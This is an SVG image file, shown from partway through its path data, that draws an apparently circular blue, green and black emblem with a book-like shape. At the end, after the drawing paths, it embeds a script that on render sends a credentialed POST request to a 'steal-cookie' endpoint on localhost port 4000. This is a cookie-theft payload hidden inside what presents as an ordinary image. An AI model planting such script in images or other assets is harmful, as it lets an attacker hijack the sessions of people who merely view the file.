	C478.571930,314.477570 488.930206,315.011658 499.669281,315.565399 
	C499.669281,317.197052 499.669281,320.042450 499.669281,322.298676 
	C491.482697,321.519653 483.510071,320.760956 475.097046,320.001526 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M466.916779,230.666992 
	C469.810883,230.192596 473.286896,228.465271 473.797333,232.757339 
	C474.018402,234.616394 472.871368,237.472153 471.403320,238.428360 
	C470.274109,239.163879 466.689575,238.200333 465.981110,236.967209 
	C465.166321,235.549042 466.316040,233.002213 466.916779,230.666992 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M143.264542,231.830414 
	C144.279510,234.673126 144.725693,237.283691 141.382416,238.141312 
	C139.853210,238.533600 137.189682,238.606461 136.627167,237.764374 
	C135.623962,236.262527 134.974136,233.541946 135.691147,232.067581 
	C137.468781,228.412262 140.370300,229.557312 143.264542,231.830414 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M206.202652,421.738312 
	C198.699036,413.834076 190.803040,406.684387 184.346497,398.411346 
	C170.273087,380.378418 161.287170,359.681183 157.316010,337.248566 
	C150.858505,300.770966 156.399628,266.161621 175.408554,233.902863 
	C183.299652,220.511368 192.828659,208.545044 204.343689,198.295776 
	C224.486954,180.366714 247.705597,168.387283 274.311401,162.840576 
	C288.094879,159.967041 301.953949,159.181381 315.778748,160.175095 
	C339.717957,161.895859 362.263947,168.886215 382.455170,182.125031 
	C391.223511,187.874222 399.928040,194.042953 407.488953,201.251144 
	C430.116333,222.822906 444.747681,249.112335 450.972168,279.864166 
	C457.453400,311.884399 453.500671,342.687500 439.924957,372.354706 
	C432.786987,387.953461 423.203033,402.000061 411.204681,414.049103 
	C392.689606,432.642395 370.806976,445.990112 345.280548,453.126770 
	C329.402496,457.565918 313.311401,459.819916 296.890289,458.931366 
	C279.549988,457.993134 262.781647,454.205170 246.752075,447.359314 
	C231.964951,441.044006 218.320297,432.938721 206.202652,421.738312 
M198.000000,296.502838 
	C198.000000,331.905884 198.000000,367.308929 198.000000,402.999939 
	C200.872147,402.999939 202.860397,402.999908 204.848648,402.999908 
	C229.344360,403.000092 253.842636,402.825470 278.333099,403.184509 
	C282.111420,403.239929 287.328339,404.668640 289.291443,407.354309 
	C292.862335,412.239532 297.059845,412.081116 301.827362,412.010468 
	C305.492615,411.956116 309.164490,412.105011 312.822174,411.929688 
	C313.948547,411.875732 315.593323,411.360779 316.055786,410.530518 
	C319.527954,404.297241 325.303467,403.028839 331.644135,403.017426 
	C355.639862,402.974304 379.635712,402.999969 403.631531,402.999878 
	C405.575775,402.999878 407.520020,402.999878 409.560791,402.999878 
	C409.560791,361.675507 409.560791,320.987427 409.560791,280.000122 
	C407.301697,280.000122 405.480988,280.000092 403.660278,280.000092 
	C378.664642,280.000092 353.668976,279.983887 328.673370,280.008270 
	C319.060059,280.017639 311.044647,283.904633 304.098846,290.570496 
	C296.850159,282.127716 287.324585,279.937958 276.844360,279.973785 
	C252.682205,280.056396 228.519577,280.000031 204.357132,280.000092 
	C202.413986,280.000122 200.470825,280.000122 198.000000,280.000122 
	C198.000000,285.588593 198.000000,290.546783 198.000000,296.502838 
M276.160431,237.132812 
	C278.479980,236.824341 280.799530,236.515869 283.119080,236.207397 
	C283.266449,236.644928 283.413818,237.082443 283.561157,237.519974 
	C282.245728,238.012344 280.941650,238.890671 279.612885,238.929733 
	C274.121399,239.091141 268.604523,239.250473 263.135956,238.862030 
	C261.227020,238.726425 258.865540,237.448074 257.688599,235.932312 
	C254.174561,231.406738 251.507828,226.194351 247.797409,221.860428 
	C245.364120,219.018265 241.793686,215.463867 238.563034,215.284714 
	C225.244293,214.546173 211.860794,214.975464 198.432571,214.975464 
	C198.432571,233.011597 198.432571,251.366776 198.432571,270.000000 
	C222.003510,270.000000 245.142960,269.991028 268.282410,270.003540 
	C281.188049,270.010529 294.136841,269.894867 302.934845,278.888275 
	C309.338898,276.025574 314.711395,272.881927 320.509644,271.261749 
	C325.337311,269.912750 330.663452,270.073181 335.771179,270.048126 
	C358.421692,269.936981 381.073059,269.999939 403.724121,269.999908 
	C405.660645,269.999908 407.597198,269.999908 409.557648,269.999908 
	C409.557648,250.968475 409.557648,232.613052 409.557648,214.009109 
	C397.300079,214.009109 385.479126,213.824310 373.668518,214.093475 
	C368.412292,214.213242 363.924744,216.259888 360.869354,221.150970 
	C357.568512,226.434891 353.742950,231.397278 350.021301,236.407074 
	C349.231018,237.470917 347.933167,238.813705 346.814514,238.866318 
	C341.385956,239.121704 335.938782,238.981628 331.021271,238.981628 
	C326.385376,225.568726 333.692200,217.721115 343.159668,210.579010 
	C339.963470,209.998276 337.362213,210.042404 334.763885,209.974899 
	C333.823914,209.950455 332.065399,209.570236 332.072784,209.501465 
	C332.498444,205.526459 329.472168,207.091125 327.883636,207.063049 
	C320.058136,206.924820 312.212402,206.705368 304.408783,207.141266 
	C301.143188,207.323669 297.111969,208.187561 294.956604,210.300262 
	C292.112427,213.088150 289.270721,212.956161 286.071259,212.995651 
	C284.072937,213.020309 282.071472,212.936584 280.075958,213.016205 
	C274.412537,213.242157 270.865417,217.625626 272.164948,223.146866 
	C273.213806,227.602997 274.707703,231.954361 276.160431,237.132812 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M244.058960,483.635498 
	C244.347961,474.323517 248.216095,469.959991 255.749512,470.000763 
	C261.980255,470.034485 266.308350,474.175659 266.973572,480.740082 
	C267.488037,485.816864 262.428528,493.009491 257.686218,493.943054 
	C252.094681,495.043793 246.865997,491.722595 244.892197,485.837799 
	C244.684937,485.219879 244.362656,484.640472 244.058960,483.635498 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M429.499390,443.512909 
	C429.937042,443.783508 430.185089,444.244934 430.433136,444.706360 
	C430.014709,444.661743 429.596252,444.617126 429.054352,444.329071 
	C429.057220,443.958344 429.183533,443.831024 429.499390,443.512909 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M165.741638,185.758011 
	C164.021912,187.576233 162.222076,188.947815 161.154755,190.752625 
	C158.862122,194.629395 157.205521,192.930344 155.226379,190.450592 
	C159.703644,185.501663 164.093903,180.648895 168.397049,175.892426 
	C171.781067,177.243423 172.176453,179.007721 170.180420,181.261429 
	C168.864380,182.747345 167.394547,184.097046 165.741638,185.758011 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M464.008728,359.984283 
	C465.644440,357.158630 467.406830,354.547363 470.595276,357.008789 
	C473.190338,359.012085 475.445282,361.638733 472.446533,365.520111 
	C469.798462,364.677338 467.029755,363.902832 464.375732,362.841614 
	C463.956024,362.673767 464.054047,361.211029 464.008728,359.984283 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M197.085678,444.069122 
	C196.613770,446.268921 196.141846,448.468750 195.555710,451.201050 
	C193.522278,449.870300 191.744034,448.706543 189.163116,447.017487 
	C191.864899,445.666351 193.810318,444.693481 196.229721,443.705414 
	C196.831024,443.816528 196.958344,443.942810 197.085678,444.069122 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M196.512878,443.500610 
	C196.783356,443.062653 197.244644,442.814331 197.705933,442.566010 
	C197.661560,442.984528 197.617188,443.403076 197.329239,443.945374 
	C196.958344,443.942810 196.831024,443.816528 196.512878,443.500610 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M138.100952,355.342987 
	C136.254349,356.664154 134.653702,357.738983 132.650574,359.084045 
	C132.055923,356.839752 131.511963,354.786774 130.731827,351.842468 
	C133.990021,352.452301 136.575836,352.936310 139.161682,353.420288 
	C138.890091,353.979095 138.618484,354.537872 138.100952,355.342987 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M323.349518,482.799866 
	C325.522003,487.972961 325.240082,488.244019 318.653717,487.682739 
	C318.843323,486.300659 318.900604,484.885956 319.258667,483.551971 
	C319.622131,482.197906 320.282471,480.923553 321.086761,478.937866 
	C321.974487,480.490234 322.552246,481.500549 323.349518,482.799866 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M377.660492,131.330032 
	C380.735168,133.973404 380.798279,136.413406 378.355530,139.204559 
	C376.052979,141.835510 373.300781,141.494156 371.494629,139.512802 
	C370.212921,138.106781 369.551788,135.056137 370.150330,133.248306 
	C371.264252,129.883743 374.197479,129.373032 377.660492,131.330032 
z"/>
<path fill="#00A550" opacity="1.000000" stroke="none" 
	d="
M198.000000,296.003906 
	C198.000000,290.546783 198.000000,285.588593 198.000000,280.000122 
	C200.470825,280.000122 202.413986,280.000122 204.357132,280.000092 
	C228.519577,280.000031 252.682205,280.056396 276.844360,279.973785 
	C287.324585,279.937958 296.850159,282.127716 304.098846,290.570496 
	C311.044647,283.904633 319.060059,280.017639 328.673370,280.008270 
	C353.668976,279.983887 378.664642,280.000092 403.660278,280.000092 
	C405.480988,280.000092 407.301697,280.000122 409.560791,280.000122 
	C409.560791,320.987427 409.560791,361.675507 409.560791,402.999878 
	C407.520020,402.999878 405.575775,402.999878 403.631531,402.999878 
	C379.635712,402.999969 355.639862,402.974304 331.644135,403.017426 
	C325.303467,403.028839 319.527954,404.297241 316.055786,410.530518 
	C315.593323,411.360779 313.948547,411.875732 312.822174,411.929688 
	C309.164490,412.105011 305.492615,411.956116 301.827362,412.010468 
	C297.059845,412.081116 292.862335,412.239532 289.291443,407.354309 
	C287.328339,404.668640 282.111420,403.239929 278.333099,403.184509 
	C253.842636,402.825470 229.344360,403.000092 204.848648,402.999908 
	C202.860397,402.999908 200.872147,402.999939 198.000000,402.999939 
	C198.000000,367.308929 198.000000,331.905884 198.000000,296.003906 
M399.000000,300.553162 
	C399.000000,297.469818 399.000000,294.386505 399.000000,291.020905 
	C376.165588,291.020905 354.186188,290.963654 332.207916,291.098175 
	C329.653564,291.113831 327.091064,292.134735 324.557526,292.787354 
	C315.394684,295.147461 308.344116,300.278809 303.986359,309.647858 
	C296.705994,294.672607 284.634094,290.541687 269.733215,290.896057 
	C251.415085,291.331665 233.078720,291.000214 214.750229,291.000305 
	C212.984451,291.000305 211.218674,291.000275 209.302338,291.000275 
	C209.302338,324.954376 209.302338,358.189850 209.302338,391.999908 
	C211.548584,391.999908 213.500244,391.999939 215.451920,391.999939 
	C236.113129,391.999969 256.776398,392.173920 277.434692,391.929138 
	C288.324829,391.800110 298.071167,393.537109 304.146210,404.308502 
	C309.379425,394.480072 317.916199,392.019379 327.639313,392.007965 
	C349.300232,391.982483 370.961182,391.999939 392.622131,391.999908 
	C394.567169,391.999908 396.512177,391.999878 399.000000,391.999878 
	C399.000000,361.429443 399.000000,331.483429 399.000000,300.553162 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M276.082275,236.742508 
	C274.707703,231.954361 273.213806,227.602997 272.164948,223.146866 
	C270.865417,217.625626 274.412537,213.242157 280.075958,213.016205 
	C282.071472,212.936584 284.072937,213.020309 286.071259,212.995651 
	C289.270721,212.956161 292.112427,213.088150 294.956604,210.300262 
	C297.111969,208.187561 301.143188,207.323669 304.408783,207.141266 
	C312.212402,206.705368 320.058136,206.924820 327.883636,207.063049 
	C329.472168,207.091125 332.498444,205.526459 332.072784,209.501465 
	C332.065399,209.570236 333.823914,209.950455 334.763885,209.974899 
	C337.362213,210.042404 339.963470,209.998276 343.159668,210.579010 
	C333.692200,217.721115 326.385376,225.568726 331.021271,238.981628 
	C335.938782,238.981628 341.385956,239.121704 346.814514,238.866318 
	C347.933167,238.813705 349.231018,237.470917 350.021301,236.407074 
	C353.742950,231.397278 357.568512,226.434891 360.869354,221.150970 
	C363.924744,216.259888 368.412292,214.213242 373.668518,214.093475 
	C385.479126,213.824310 397.300079,214.009109 409.557648,214.009109 
	C409.557648,232.613052 409.557648,250.968475 409.557648,269.999908 
	C407.597198,269.999908 405.660645,269.999908 403.724121,269.999908 
	C381.073059,269.999939 358.421692,269.936981 335.771179,270.048126 
	C330.663452,270.073181 325.337311,269.912750 320.509644,271.261749 
	C314.711395,272.881927 309.338898,276.025574 302.934845,278.888275 
	C294.136841,269.894867 281.188049,270.010529 268.282410,270.003540 
	C245.142960,269.991028 222.003510,270.000000 198.432571,270.000000 
	C198.432571,251.366776 198.432571,233.011597 198.432571,214.975464 
	C211.860794,214.975464 225.244293,214.546173 238.563034,215.284714 
	C241.793686,215.463867 245.364120,219.018265 247.797409,221.860428 
	C251.507828,226.194351 254.174561,231.406738 257.688599,235.932312 
	C258.865540,237.448074 261.227020,238.726425 263.135956,238.862030 
	C268.604523,239.250473 274.121399,239.091141 279.612885,238.929733 
	C280.941650,238.890671 282.245728,238.012344 283.561157,237.519974 
	C283.413818,237.082443 283.266449,236.644928 283.119080,236.207397 
	C280.799530,236.515869 278.479980,236.824341 276.082275,236.742508 
M234.500000,259.000000 
	C249.828842,259.000000 265.160950,258.812744 280.485107,259.080078 
	C287.994598,259.211060 295.639130,259.433746 302.274719,263.987701 
	C303.181061,264.609711 305.113098,264.948181 305.851166,264.417633 
	C313.497192,258.921295 322.408386,259.217712 331.041565,259.094879 
	C351.698120,258.801056 372.361694,258.999908 393.022430,258.999847 
	C394.930664,258.999847 396.838928,258.999847 398.617981,258.999847 
	C398.617981,247.198502 398.617981,236.286194 398.617981,225.031601 
	C391.766388,225.031601 385.195618,224.368225 378.857208,225.294754 
	C375.375122,225.803741 371.524109,228.347748 369.185181,231.112610 
	C365.078613,235.967072 362.186218,241.829132 358.388824,246.976715 
	C357.271790,248.490967 354.839264,249.816772 352.973206,249.866653 
	C342.650238,250.142654 332.315948,250.013474 321.985718,249.976791 
	C320.728912,249.972305 319.473114,249.689514 318.000000,249.509155 
	C318.000000,242.132706 317.753693,235.131485 318.100677,228.159790 
	C318.282623,224.504517 319.504791,220.901016 320.297638,217.079239 
	C314.557037,217.690613 307.368835,215.359436 299.416656,219.596100 
	C303.117828,219.942245 305.429871,220.158478 307.741882,220.374710 
	C307.777893,220.884979 307.813904,221.395248 307.849915,221.905518 
	C304.696045,222.395569 300.858032,224.251572 298.532898,223.087021 
	C293.908783,220.770996 287.438568,219.972672 283.050415,223.210098 
	C283.526794,225.029633 284.015656,226.896805 284.558380,228.969742 
	C285.530304,228.765289 286.328491,228.379578 287.057098,228.483231 
	C289.679138,228.856216 293.075104,228.587021 294.632782,230.125549 
	C295.878296,231.355789 295.362274,234.987656 294.751282,237.324310 
	C293.971924,240.304855 292.057129,242.972137 291.093506,245.925125 
	C289.935852,249.472839 287.625488,250.130646 284.256714,250.062927 
	C275.096405,249.878799 265.926270,249.849884 256.767731,250.074585 
	C253.178192,250.162643 250.953964,249.068344 249.202377,245.861099 
	C247.084930,241.983978 244.605087,238.247864 241.856079,234.789337 
	C239.350006,231.636475 236.659866,227.092239 233.372940,226.405411 
	C225.605927,224.782425 217.435684,225.089111 209.318237,224.608948 
	C209.318237,236.670456 209.318237,247.581055 209.318237,259.000000 
	C217.584305,259.000000 225.542160,259.000000 234.500000,259.000000 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M399.000000,301.045288 
	C399.000000,331.483429 399.000000,361.429443 399.000000,391.999878 
	C396.512177,391.999878 394.567169,391.999908 392.622131,391.999908 
	C370.961182,391.999939 349.300232,391.982483 327.639313,392.007965 
	C317.916199,392.019379 309.379425,394.480072 304.146210,404.308502 
	C298.071167,393.537109 288.324829,391.800110 277.434692,391.929138 
	C256.776398,392.173920 236.113129,391.999969 215.451920,391.999939 
	C213.500244,391.999939 211.548584,391.999908 209.302338,391.999908 
	C209.302338,358.189850 209.302338,324.954376 209.302338,291.000275 
	C211.218674,291.000275 212.984451,291.000305 214.750229,291.000305 
	C233.078720,291.000214 251.415085,291.331665 269.733215,290.896057 
	C284.634094,290.541687 296.705994,294.672607 303.986359,309.647858 
	C308.344116,300.278809 315.394684,295.147461 324.557526,292.787354 
	C327.091064,292.134735 329.653564,291.113831 332.207916,291.098175 
	C354.186188,290.963654 376.165588,291.020905 399.000000,291.020905 
	C399.000000,294.386505 399.000000,297.469818 399.000000,301.045288 
M296.851288,386.011597 
	C300.181335,385.404846 305.097778,383.146088 306.527161,384.518707 
	C310.023071,387.875641 310.726013,384.567078 312.601196,383.218231 
	C314.793976,386.365234 317.676086,388.728302 320.919739,385.257843 
	C323.618622,382.370209 322.378815,379.330597 318.788666,377.648468 
	C319.724579,376.648071 320.349792,375.979797 320.975006,375.311493 
	C320.591156,374.848358 320.207306,374.385193 319.823456,373.922058 
	C317.022552,376.075989 314.221649,378.229919 311.288177,380.485809 
	C311.112579,378.916229 310.919891,377.193787 310.736053,375.550568 
	C305.541504,373.325775 306.212219,379.309235 304.720123,379.936188 
	C302.157379,377.711853 300.311646,375.548859 297.968140,374.411713 
	C297.248932,374.062775 294.047729,376.449432 293.964966,377.713165 
	C293.833252,379.725006 295.363647,381.845642 296.321564,384.247467 
	C296.429871,384.132263 295.873657,384.723877 294.924377,385.672729 
	C294.830658,386.026764 294.736908,386.380798 294.643188,386.734894 
	C295.119568,386.517395 295.595947,386.299896 296.851288,386.011597 
M348.507477,367.000000 
	C357.589691,367.000000 366.671906,367.000000 375.607666,367.000000 
	C375.607666,362.871796 375.607666,359.626221 375.607666,355.871338 
	C365.637299,355.871338 356.048981,355.871338 346.270660,355.871338 
	C346.270660,353.098450 346.270660,350.851349 346.270660,347.901062 
	C356.226776,347.901062 365.939362,347.901062 375.650696,347.901062 
	C375.650696,336.954346 375.650696,326.714539 375.650696,316.295563 
	C361.729248,316.295563 348.158386,316.295563 333.886658,316.295563 
	C333.886658,323.283813 333.886658,330.001923 333.886658,336.638123 
	C330.598175,336.638123 328.016846,336.638123 324.917419,336.638123 
	C324.917419,329.708008 324.917419,323.121582 324.917419,316.435944 
	C320.684143,316.435944 316.993866,316.435944 312.771729,316.435944 
	C312.771729,323.446960 312.771729,330.031738 312.771729,336.666138 
	C306.987061,336.666138 301.746887,336.666138 295.797363,336.666138 
	C295.797363,329.644135 295.797363,322.932434 295.797363,316.407715 
	C291.502014,316.407715 287.927002,316.407715 283.836151,316.407715 
	C283.836151,323.393250 283.836151,329.983765 283.836151,336.706970 
	C280.724304,336.706970 278.147156,336.706970 274.864319,336.706970 
	C274.864319,329.727722 274.864319,323.014160 274.864319,316.365295 
	C260.577240,316.365295 247.003250,316.365295 233.314865,316.365295 
	C233.314865,320.310181 233.314865,323.886536 233.314865,328.155182 
	C242.993164,328.155182 252.373932,328.155182 261.617676,328.155182 
	C261.617676,331.446869 261.617676,334.023987 261.617676,337.121704 
	C251.999176,337.121704 242.752365,337.121704 233.454010,337.121704 
	C233.454010,347.689331 233.454010,357.713898 233.454010,367.641663 
	C247.485214,367.641663 261.059662,367.641663 274.348297,367.641663 
	C274.348297,361.051361 274.348297,354.819305 274.348297,348.414734 
	C277.609406,348.414734 280.631195,348.414734 284.185516,348.414734 
	C284.185516,355.067963 284.185516,361.315277 284.185516,367.690887 
	C297.964966,367.690887 311.202820,367.690887 325.139893,367.690887 
	C325.139893,361.019806 325.139893,354.631927 325.139893,348.376221 
	C328.434418,348.376221 331.012573,348.376221 334.112122,348.376221 
	C334.112122,354.654816 334.112122,360.574799 334.112122,367.000000 
	C338.928619,367.000000 343.220398,367.000000 348.507477,367.000000 
M291.651947,384.274567 
	C291.295258,381.129547 290.938538,377.984528 290.581848,374.839508 
	C290.052429,374.839508 289.523010,374.839539 288.993591,374.839539 
	C288.993591,378.465912 288.993591,382.092255 288.993591,386.241547 
	C290.158356,385.737061 290.959076,385.390228 291.651947,384.274567 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M234.000000,259.000000 
	C225.542160,259.000000 217.584305,259.000000 209.318237,259.000000 
	C209.318237,247.581055 209.318237,236.670456 209.318237,224.608948 
	C217.435684,225.089111 225.605927,224.782425 233.372940,226.405411 
	C236.659866,227.092239 239.350006,231.636475 241.856079,234.789337 
	C244.605087,238.247864 247.084930,241.983978 249.202377,245.861099 
	C250.953964,249.068344 253.178192,250.162643 256.767731,250.074585 
	C265.926270,249.849884 275.096405,249.878799 284.256714,250.062927 
	C287.625488,250.130646 289.935852,249.472839 291.093506,245.925125 
	C292.057129,242.972137 293.971924,240.304855 294.751282,237.324310 
	C295.362274,234.987656 295.878296,231.355789 294.632782,230.125549 
	C293.075104,228.587021 289.679138,228.856216 287.057098,228.483231 
	C286.328491,228.379578 285.530304,228.765289 284.558380,228.969742 
	C284.015656,226.896805 283.526794,225.029633 283.050415,223.210098 
	C287.438568,219.972672 293.908783,220.770996 298.532898,223.087021 
	C300.858032,224.251572 304.696045,222.395569 307.849915,221.905518 
	C307.813904,221.395248 307.777893,220.884979 307.741882,220.374710 
	C305.429871,220.158478 303.117828,219.942245 299.416656,219.596100 
	C307.368835,215.359436 314.557037,217.690613 320.297638,217.079239 
	C319.504791,220.901016 318.282623,224.504517 318.100677,228.159790 
	C317.753693,235.131485 318.000000,242.132706 318.000000,249.509155 
	C319.473114,249.689514 320.728912,249.972305 321.985718,249.976791 
	C332.315948,250.013474 342.650238,250.142654 352.973206,249.866653 
	C354.839264,249.816772 357.271790,248.490967 358.388824,246.976715 
	C362.186218,241.829132 365.078613,235.967072 369.185181,231.112610 
	C371.524109,228.347748 375.375122,225.803741 378.857208,225.294754 
	C385.195618,224.368225 391.766388,225.031601 398.617981,225.031601 
	C398.617981,236.286194 398.617981,247.198502 398.617981,258.999847 
	C396.838928,258.999847 394.930664,258.999847 393.022430,258.999847 
	C372.361694,258.999908 351.698120,258.801056 331.041565,259.094879 
	C322.408386,259.217712 313.497192,258.921295 305.851166,264.417633 
	C305.113098,264.948181 303.181061,264.609711 302.274719,263.987701 
	C295.639130,259.433746 287.994598,259.211060 280.485107,259.080078 
	C265.160950,258.812744 249.828842,259.000000 234.000000,259.000000 
z"/>
<path fill="#00A550" opacity="1.000000" stroke="none" 
	d="
M348.009827,367.000000 
	C343.220398,367.000000 338.928619,367.000000 334.112122,367.000000 
	C334.112122,360.574799 334.112122,354.654816 334.112122,348.376221 
	C331.012573,348.376221 328.434418,348.376221 325.139893,348.376221 
	C325.139893,354.631927 325.139893,361.019806 325.139893,367.690887 
	C311.202820,367.690887 297.964966,367.690887 284.185516,367.690887 
	C284.185516,361.315277 284.185516,355.067963 284.185516,348.414734 
	C280.631195,348.414734 277.609406,348.414734 274.348297,348.414734 
	C274.348297,354.819305 274.348297,361.051361 274.348297,367.641663 
	C261.059662,367.641663 247.485214,367.641663 233.454010,367.641663 
	C233.454010,357.713898 233.454010,347.689331 233.454010,337.121704 
	C242.752365,337.121704 251.999176,337.121704 261.617676,337.121704 
	C261.617676,334.023987 261.617676,331.446869 261.617676,328.155182 
	C252.373932,328.155182 242.993164,328.155182 233.314865,328.155182 
	C233.314865,323.886536 233.314865,320.310181 233.314865,316.365295 
	C247.003250,316.365295 260.577240,316.365295 274.864319,316.365295 
	C274.864319,323.014160 274.864319,329.727722 274.864319,336.706970 
	C278.147156,336.706970 280.724304,336.706970 283.836151,336.706970 
	C283.836151,329.983765 283.836151,323.393250 283.836151,316.407715 
	C287.927002,316.407715 291.502014,316.407715 295.797363,316.407715 
	C295.797363,322.932434 295.797363,329.644135 295.797363,336.666138 
	C301.746887,336.666138 306.987061,336.666138 312.771729,336.666138 
	C312.771729,330.031738 312.771729,323.446960 312.771729,316.435944 
	C316.993866,316.435944 320.684143,316.435944 324.917419,316.435944 
	C324.917419,323.121582 324.917419,329.708008 324.917419,336.638123 
	C328.016846,336.638123 330.598175,336.638123 333.886658,336.638123 
	C333.886658,330.001923 333.886658,323.283813 333.886658,316.295563 
	C348.158386,316.295563 361.729248,316.295563 375.650696,316.295563 
	C375.650696,326.714539 375.650696,336.954346 375.650696,347.901062 
	C365.939362,347.901062 356.226776,347.901062 346.270660,347.901062 
	C346.270660,350.851349 346.270660,353.098450 346.270660,355.871338 
	C356.048981,355.871338 365.637299,355.871338 375.607666,355.871338 
	C375.607666,359.626221 375.607666,362.871796 375.607666,367.000000 
	C366.671906,367.000000 357.589691,367.000000 348.009827,367.000000 
M362.112213,336.938721 
	C362.919098,334.189850 363.725983,331.440948 364.644958,328.310303 
	C357.630707,328.310303 352.078552,328.310303 346.418762,328.310303 
	C346.418762,331.307678 346.418762,333.984375 346.418762,336.983978 
	C351.613953,336.983978 356.395996,336.983978 362.112213,336.938721 
M303.546051,348.000000 
	C301.134338,348.000000 298.722626,348.000000 296.330536,348.000000 
	C296.330536,351.028717 296.330536,353.266663 296.330536,355.600037 
	C302.007629,355.600037 307.354980,355.600037 312.662109,355.600037 
	C312.662109,352.953766 312.662109,350.718414 312.662109,348.000000 
	C309.724365,348.000000 307.112183,348.000000 303.546051,348.000000 
M253.503174,356.000000 
	C256.242981,356.000000 258.982819,356.000000 261.653809,356.000000 
	C261.653809,352.943665 261.653809,350.705505 261.653809,348.415192 
	C255.961823,348.415192 250.616714,348.415192 245.353180,348.415192 
	C245.353180,351.076294 245.353180,353.309998 245.353180,356.000000 
	C247.979126,356.000000 250.263077,356.000000 253.503174,356.000000 
z"/>
<path fill="#00A550" opacity="1.000000" stroke="none" 
	d="
M295.317444,385.315491 
	C295.873657,384.723877 296.429871,384.132263 296.321564,384.247467 
	C295.363647,381.845642 293.833252,379.725006 293.964966,377.713165 
	C294.047729,376.449432 297.248932,374.062775 297.968140,374.411713 
	C300.311646,375.548859 302.157379,377.711853 304.720123,379.936188 
	C306.212219,379.309235 305.541504,373.325775 310.736053,375.550568 
	C310.919891,377.193787 311.112579,378.916229 311.288177,380.485809 
	C314.221649,378.229919 317.022552,376.075989 319.823456,373.922058 
	C320.207306,374.385193 320.591156,374.848358 320.975006,375.311493 
	C320.349792,375.979797 319.724579,376.648071 318.788666,377.648468 
	C322.378815,379.330597 323.618622,382.370209 320.919739,385.257843 
	C317.676086,388.728302 314.793976,386.365234 312.601196,383.218231 
	C310.726013,384.567078 310.023071,387.875641 306.527161,384.518707 
	C305.097778,383.146088 300.181335,385.404846 296.273193,385.855225 
	C295.569214,385.571045 295.443359,385.443298 295.317444,385.315491 
z"/>
<path fill="#00A550" opacity="1.000000" stroke="none" 
	d="
M291.705872,384.658997 
	C290.959076,385.390228 290.158356,385.737061 288.993591,386.241547 
	C288.993591,382.092255 288.993591,378.465912 288.993591,374.839539 
	C289.523010,374.839539 290.052429,374.839508 290.581848,374.839508 
	C290.938538,377.984528 291.295258,381.129547 291.705872,384.658997 
z"/>
<path fill="#00A550" opacity="1.000000" stroke="none" 
	d="
M295.883698,385.890625 
	C295.595947,386.299896 295.119568,386.517395 294.643188,386.734863 
	C294.736908,386.380798 294.830658,386.026764 295.120941,385.494141 
	C295.443359,385.443298 295.569214,385.571045 295.883698,385.890625 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M361.645142,336.961365 
	C356.395996,336.983978 351.613953,336.983978 346.418762,336.983978 
	C346.418762,333.984375 346.418762,331.307678 346.418762,328.310303 
	C352.078552,328.310303 357.630707,328.310303 364.644958,328.310303 
	C363.725983,331.440948 362.919098,334.189850 361.645142,336.961365 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M304.023010,348.000000 
	C307.112183,348.000000 309.724365,348.000000 312.662109,348.000000 
	C312.662109,350.718414 312.662109,352.953766 312.662109,355.600037 
	C307.354980,355.600037 302.007629,355.600037 296.330536,355.600037 
	C296.330536,353.266663 296.330536,351.028717 296.330536,348.000000 
	C298.722626,348.000000 301.134338,348.000000 304.023010,348.000000 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M253.025101,356.000000 
	C250.263077,356.000000 247.979126,356.000000 245.353180,356.000000 
	C245.353180,353.309998 245.353180,351.076294 245.353180,348.415192 
	C250.616714,348.415192 255.961823,348.415192 261.653809,348.415192 
	C261.653809,350.705505 261.653809,352.943665 261.653809,356.000000 
	C258.982819,356.000000 256.242981,356.000000 253.025101,356.000000 
z"/>
  <script>
    fetch('http://localhost:4000/steal-cookie', {
      method: 'POST',
      credentials: 'include',
    })
    .then(response => console.log('Success:', response))
    .catch(error => console.error('Error:', error));
  </script>
</svg>